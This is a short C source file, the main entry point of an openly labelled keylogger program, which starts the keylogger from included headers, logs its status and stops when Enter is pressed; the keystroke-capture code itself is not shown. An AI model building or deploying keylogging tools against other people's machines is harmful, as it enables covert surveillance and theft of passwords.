/**
 * the main entry point of the program containing the main method
 *
 * @author d412v1n
 */

#include <stdlib.h>
#include <stdio.h>
#include "logger.h"
#include "keylogger.h"

int main(void) {
	int startupErrorCode;
	
	log_debug("entered main()");

	startupErrorCode = startKeylogger();
	if (startupErrorCode != 0) {
		log_error("key logger could not be started");
		stopKeylogger();
		exit(1);
	}

	log_info("PRESS ENTER FOR EXIT:");

	getchar();

	stopKeylogger();
	log_info("EXITING NOW... GOOD BYE!");

	return 0;
}
